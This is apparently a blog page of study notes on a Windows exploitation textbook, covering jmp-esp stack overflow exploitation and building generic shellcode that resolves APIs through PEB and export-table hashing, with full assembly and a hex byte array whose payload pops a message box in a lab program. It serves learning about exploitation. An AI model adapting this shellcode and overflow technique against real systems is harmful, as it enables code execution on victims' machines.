@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="notes for chapter3from 3.2问题描述：我们再之前的学习中使用的覆盖返回地址的方法不适用与普适情况，如当PE程序被重新加载时，栈桢可能发生移位的情况，这个时候我们得buff区的地址就需要重新计算。   解决方案：一个函数返回时，esp正好指向原理存储返回地址的下一位，我们将shellcode从ret_addr的后一个位置开始填充，并将ret_addr填充为一个进程中的”jmp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note chapter 3">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="notes for chapter3from 3.2问题描述：我们再之前的学习中使用的覆盖返回地址的方法不适用与普适情况，如当PE程序被重新加载时，栈桢可能发生移位的情况，这个时候我们得buff区的地址就需要重新计算。   解决方案：一个函数返回时，esp正好指向原理存储返回地址的下一位，我们将shellcode从ret_addr的后一个位置开始填充，并将ret_addr填充为一个进程中的”jmp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;jmpesp_addr.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;exitaddr.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;shellcode.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;urlcode.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;success1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;success2.JPG">
+<meta property="og:updated_time" content="2021-02-22T07:40:02.636Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;02&#x2F;22&#x2F;0day-3&#x2F;jmpesp_addr.JPG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/02/22/0day-3/"/>
+
+
+
+
+
+  <title>note chapter 3 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-《0-day》笔记">
+          <a href="/categories/note1" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            《0 day》笔记
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-《加密与解密》笔记">
+          <a href="/categories/note2" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            《加密与解密》笔记
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/22/0day-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">note chapter 3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-22T15:37:16+08:00">
+                2021-02-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/note1/" itemprop="url" rel="index">
+                    <span itemprop="name">note1</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="notes-for-chapter3"><a href="#notes-for-chapter3" class="headerlink" title="notes for chapter3"></a>notes for chapter3</h1><h2 id="from-3-2"><a href="#from-3-2" class="headerlink" title="from 3.2"></a>from 3.2</h2><h3 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h3><p>我们再之前的学习中使用的覆盖返回地址的方法不适用与普适情况，如当PE程序被重新加载时，栈桢可能发生移位的情况，这个时候我们得buff区的地址就需要重新计算。  </p>
+<h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><p>一个函数返回时，esp正好指向原理存储返回地址的下一位，我们将shellcode从ret_addr的后一个位置开始填充，并将ret_addr填充为一个进程中的”jmp esp”的指令的地址，这样函数返回后就会跳到esp指向的栈顶的位置开始执行shellcode。</p>
+<a id="more"></a>
+
+<h2 id="3-2-3-experiment"><a href="#3-2-3-experiment" class="headerlink" title="3.2.3 experiment"></a>3.2.3 experiment</h2><p>使用程序找出进程中的user32.dll中的jmp esp的指令的地址：<br><img src="/2021/02/22/0day-3/jmpesp_addr.JPG" alt="jmpesp"><br>这里使用0x77d8625f这个地址构造exp（到底使用哪一个其实需要测试一下，我第一次测试不对，第二次使用该地址就可以了）。<br>然后根据实验需求，我们需要在弹窗结束后正常退出，即在最后加上这么一段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,exit_addr</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure>
+<p>所以我找到ExitProcess这个函数的虚拟地址：<br><img src="/2021/02/22/0day-3/exitaddr.JPG" alt="exitaddr"><br>所以这里的退出进程的虚拟地址为0x7C800000+0x0001CAFA=0x7C81CAFA。</p>
+<p>这里需要使用的其他地址：  </p>
+<ol>
+<li>MessageBoxA：0x77D507EA</li>
+</ol>
+<p>这里我使用AsmToe直接转换shellcode为机器码：<br><img src="/2021/02/22/0day-3/shellcode.JPG" alt="shellcode"></p>
+<p>填充到password.txt中：<br><img src="/2021/02/22/0day-3/urlcode.JPG" alt="code"><br>测试成功且正常退出：<br><img src="/2021/02/22/0day-3/success1.JPG" alt="success1"></p>
+<h2 id="from-3-3"><a href="#from-3-3" class="headerlink" title="from 3.3"></a>from 3.3</h2><p>缓冲区组成方式，现阶段已经讲了两种：</p>
+<ol>
+<li>将shellcode放到缓冲区，然后覆盖返回地址到缓冲区的起始地址。这种适用于缓冲区较大的场合。</li>
+<li>将shellcode放到函数返回地址以后，然后覆盖返回地址为”jmp esp”之类的指令，使得函数返回时跳转到shellcode处执行指令。这种适用于缓冲区较小的场合。</li>
+</ol>
+<p>使用的《0day2(已加密)》存在错误，P108中的，介绍缓冲区较小，shellcode快将其填满（即shellcode的最后几个字节快到栈底）时，可能会在出现shellcode被破环情况。这里几个“栈顶”改为“栈底”。</p>
+<p>P109中记录一些常用的跳板指令的十六进制机器码，要使用时使用前面提到的searchInDLL程序找user32.dll中的指令对应的地址即可。</p>
+<h2 id="from-3-4-（通用shellcode开发）"><a href="#from-3-4-（通用shellcode开发）" class="headerlink" title="from 3.4 （通用shellcode开发）"></a>from 3.4 （通用shellcode开发）</h2><p>这里其实我们得目的只有一个————定位API的地址。<br>这里书里的寻址方式如下（32位windows系统，实例为winxp）：  </p>
+<ol>
+<li>找到程序运行的线程环境块TEB。</li>
+<li>TEB的起始地址偏移0x30的地方指向进程环境块PEB。</li>
+<li>PEB的地址偏移0x0C的地方存放指向PEB_LDR_DATA结构体的指针，该指针指向一个存放着被进程装载的动态链接库的信息的结构体。</li>
+<li>PEB_LDR_DATA结构体偏移位置位0x1C的地方指向模块初始化链表的头指针InInitializationOrderModuleList。</li>
+<li>4中的链表存放PE被载入时初始化的模块信息，第一个链表节点时ntdll.dll，第二个位kernel32.dll。</li>
+<li>kernel32.dll的节点偏移0x08是kernel32.dll在内存中载入的基址。</li>
+<li>kernel32.dll的基址加0xe3C是PE头的地址。</li>
+<li>PE头偏移0x78存放着指向函数导出表的指针。</li>
+<li>安照下述方法寻址：  <ul>
+<li>导出表偏移0x1C的指针指向存储导出函数偏移地址（RVA）的列表。</li>
+<li>导出表偏移0x20指针指向存储导出函数名的列表。</li>
+<li>根据函数名找到我们要的函数是导出表中的第几个，然后再地址列表中找到对应RVA。</li>
+<li>RVA加上动态链接库的基址即是VA，这个也是我们在shellcode中需要的地址。</li>
+</ul>
+</li>
+</ol>
+<p>这里shellcode的构造为了尽可能的短，所以需要给每个API名字用一个hash去代替。<br>MessageBoxA：0x1e380a6a<br>ExitProcess：0x4fd18963<br>LoadLibraryA：0x0c917432  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 0x1e380a6a</span><br><span class="line">push 0x4fd18963 </span><br><span class="line">push 0x0c917432</span><br><span class="line">mov esi,esp</span><br><span class="line">lea edi,[esi-0xC]</span><br></pre></td></tr></table></figure>
+<p>此时栈桢结构如下：<br>|address|content|<br>|——-|——-|<br>|raw_ret_addr-0x0C||<br>|raw_ret_addr-0x08|0x0c917432，此时esp指向这里|<br>|raw_ret_addr-0x04|0x4fd18963|<br>|raw_ret_addr|0x1e380a6a|<br>|raw_ret_addr+0x04|shellcode开始四个字节|<br>抬高栈桢，保护shellcode：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor ebx,ebx</span><br><span class="line">mov bh, 0x04</span><br><span class="line">sub esp, ebx</span><br></pre></td></tr></table></figure>
+<p>然后寻址kernel.dll的装载基址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,fs:[edx+0x30]</span><br><span class="line">mov ecx,[ebx+0x0C]</span><br><span class="line">mov ecx,[ecx+0x1C]</span><br><span class="line">mov ecx,[ecx]</span><br><span class="line">mov ebp,[ecx+0x08]</span><br></pre></td></tr></table></figure>
+<p>此时ebp指向了kernel32.dll的装载基址，这里有一个坑：在mov ecx,[ecx+0x1C]后，此时ecx指向了InInitializationOrderModuleList的头指针的地址，之后mov ecx,[ecx]之后，ecx指向看第二个节点，也就是kernel32.dll的装载基址，搜集资料后，这个mov ecx,[ecx]的理由如下：  </p>
+<blockquote>
+<p>原因是这些结点的结构都用LIST_ENTRY连在一起。而LIST_ENTRY刚好是这些结点结构的第一个成员，同时LIST_ENTRY的第一个成员FLINK的作用是指向下一个LIST_ENTRY结构！</p>
+</blockquote>
+<p>完整代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">CLD ;clear flag DF &lt;=&gt; mov edx,NULL</span><br><span class="line">;store hash</span><br><span class="line">push 0x1e380a6a ;hash of MessageBoxA</span><br><span class="line">push 0x4fd18963 ;hash of ExitProcess</span><br><span class="line">push 0x0c917432 ;hash of LoadLibraryA</span><br><span class="line">mov esi,esp ;esi = addr of first function hash</span><br><span class="line">lea edi,[esi-0xc] ;edi = addr to start writing function</span><br><span class="line">;make some stack space</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov bh, 0x04</span><br><span class="line">sub esp, ebx</span><br><span class="line">;push a pointer to &quot;user32&quot; onto stack</span><br><span class="line">mov bx, 0x3233 ;rest of ebx is null</span><br><span class="line">push ebx</span><br><span class="line">push 0x72657375</span><br><span class="line">push esp</span><br><span class="line">xor edx,edx</span><br><span class="line"></span><br><span class="line">;find base addr of kernel32.dll</span><br><span class="line">mov ebx, fs:[edx + 0x30] ;ebx = address of PEB</span><br><span class="line">mov ecx, [ebx + 0x0c] ;ecx = pointer to loader data</span><br><span class="line">mov ecx, [ecx + 0x1c] ;ecx = first entry in initialization</span><br><span class="line">;order list</span><br><span class="line">mov ecx, [ecx] ;ecx = second entry in list</span><br><span class="line">;(kernel32.dll)</span><br><span class="line">mov ebp, [ecx + 0x08] ;ebp = base address of kernel32.dll</span><br><span class="line">find_lib_functions:</span><br><span class="line">lodsd ;load next hash into al and increment esi</span><br><span class="line">cmp eax, 0x1e380a6a ;hash of MessageBoxA - trigger</span><br><span class="line">;LoadLibrary(&quot;user32&quot;)</span><br><span class="line">jne find_functions</span><br><span class="line">xchg eax, ebp ;save current hash</span><br><span class="line">call [edi - 0x8] ;LoadLibraryA</span><br><span class="line">xchg eax, ebp ;restore current hash, and update ebp</span><br><span class="line">;with base address of user32.dll</span><br><span class="line">find_functions:</span><br><span class="line">	pushad ;preserve registers</span><br><span class="line">	mov eax, [ebp + 0x3c] ;eax = start of PE header</span><br><span class="line">	mov ecx, [ebp + eax + 0x78] ;ecx = relative offset of export table</span><br><span class="line">	add ecx, ebp ;ecx = absolute addr of export table</span><br><span class="line">	mov ebx, [ecx + 0x20] ;ebx = relative offset of names table</span><br><span class="line">	add ebx, ebp ;ebx = absolute addr of names table</span><br><span class="line">	xor edi, edi ;edi will count through the functions</span><br><span class="line">next_function_loop:</span><br><span class="line">	inc edi ;increment function counter</span><br><span class="line">	mov esi, [ebx + edi * 4] ;esi = relative offset of current</span><br><span class="line">	;function name</span><br><span class="line">	add esi, ebp ;esi = absolute addr of current</span><br><span class="line">	;function name</span><br><span class="line">	cdq ;dl will hold hash (we know eax is</span><br><span class="line">	;small)</span><br><span class="line">hash_loop:</span><br><span class="line">	movsx eax, byte ptr[esi]</span><br><span class="line">	cmp al,ah</span><br><span class="line">	jz compare_hash</span><br><span class="line">	ror edx,7</span><br><span class="line">	add edx,eax</span><br><span class="line">	inc esi</span><br><span class="line">	jmp hash_loop</span><br><span class="line">compare_hash:</span><br><span class="line">	cmp edx, [esp + 0x1c] ;compare to the requested hash (saved on</span><br><span class="line">	;stack from pushad)</span><br><span class="line">	jnz next_function_loop</span><br><span class="line">	mov ebx, [ecx + 0x24] ;ebx = relative offset of ordinals</span><br><span class="line">	;table</span><br><span class="line">	add ebx, ebp ;ebx = absolute addr of ordinals</span><br><span class="line">	;table</span><br><span class="line">	mov di, [ebx + 2 * edi] ;di = ordinal number of matched</span><br><span class="line">	;function</span><br><span class="line">	mov ebx, [ecx + 0x1c] ;ebx = relative offset of address</span><br><span class="line">	;table</span><br><span class="line">	add ebx, ebp ;ebx = absolute addr of address table</span><br><span class="line">	add ebp, [ebx + 4 * edi] ;add to ebp (base addr of module) the</span><br><span class="line">	;relative offset of matched function</span><br><span class="line">	xchg eax, ebp ;move func addr into eax</span><br><span class="line">	pop edi ;edi is last onto stack in pushad</span><br><span class="line">	stosd ;write function addr to [edi] and</span><br><span class="line">	;increment edi</span><br><span class="line">	push edi</span><br><span class="line">	popad ;restore registers</span><br><span class="line">	;loop until we reach end of last hash</span><br><span class="line">	cmp eax,0x1e380a6a</span><br><span class="line">	jne find_lib_functions</span><br><span class="line"></span><br><span class="line">function_call:</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	push ebx ;cut string</span><br><span class="line">	push 0x74736577</span><br><span class="line">	push 0x6C696166 ;push failwest</span><br><span class="line">	mov eax,esp ;load address of failwest</span><br><span class="line">	push ebx</span><br><span class="line">	push eax</span><br><span class="line">	push eax</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x04] ;call MessageboxA</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x08] ;call ExitProcess</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br></pre></td></tr></table></figure>
+<p>数组形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char popup_general[]=</span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;;</span><br></pre></td></tr></table></figure>
+<p>验证：<br><img src="/2021/02/22/0day-3/success2.JPG" alt="success2"><br>PS：着实费劲，而且本来用的汇编转机器码的工具有问题=. =，索性用给的测试一下了。</p>
+<h2 id="from-3-5-shellcode-编码技术"><a href="#from-3-5-shellcode-编码技术" class="headerlink" title="from 3.5 shellcode 编码技术"></a>from 3.5 shellcode 编码技术</h2><p>PS：貌似今年中科大迎新赛的一个题目的方法就是编码，贼简单，然而我没想到。<br>其实就是和加壳的效果类似，等程序装载了，shellcode才会被解压变成本来的面目。</p>
+<h2 id="from-3-6"><a href="#from-3-6" class="headerlink" title="from 3.6"></a>from 3.6</h2><p>一些有用的单字节指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xchg eax,reg 交换eax 和其他寄存器中的值</span><br><span class="line">lodsd 把esi 指向的一个dword 装入eax，并且增加esi</span><br><span class="line">lodsb 把esi 指向的一个byte 装入al，并且增加esi</span><br><span class="line">stosd</span><br><span class="line">stosb</span><br><span class="line">pushad/popad 从栈中存储/恢复所有寄存器的值</span><br><span class="line">cdq 用edx 把eax 扩展成四字。这条指令在eax&lt;0x80000000 时可用作mov edx,NULL</span><br></pre></td></tr></table></figure>
+<p>这里我们专注于如何挖漏洞以及利用漏洞，这个精简shellcode就留待以后再学习了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/22/0day-2/" rel="next" title="note chapter 2">
+                <i class="fa fa-chevron-left"></i> note chapter 2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/02/22/0day-4/" rel="prev" title="note chapter 4">
+                note chapter 4 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ivoripuion" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1711268@mail.nankai.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
